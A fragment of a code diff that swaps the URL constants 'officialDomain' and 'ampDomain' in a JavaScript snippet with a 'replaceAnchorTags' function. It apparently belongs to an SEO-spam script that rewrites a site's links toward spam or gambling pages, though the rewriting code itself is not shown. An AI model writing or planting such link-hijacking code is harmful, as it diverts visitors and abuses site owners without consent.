@@ -1,6 +1,6 @@
 // Define the official domains
-const officialDomain = 'https://bigpresence.com/contact-us/'; 
-const ampDomain = 'https://panenperkalian.pages.dev/';       
+const officialDomain = 'https://highgradehempseed.com/hemp-strains/cbg-matterhorn/'; 
+const ampDomain = 'https://istana338seo.pages.dev/';       
 
 function replaceAnchorTags() {
   
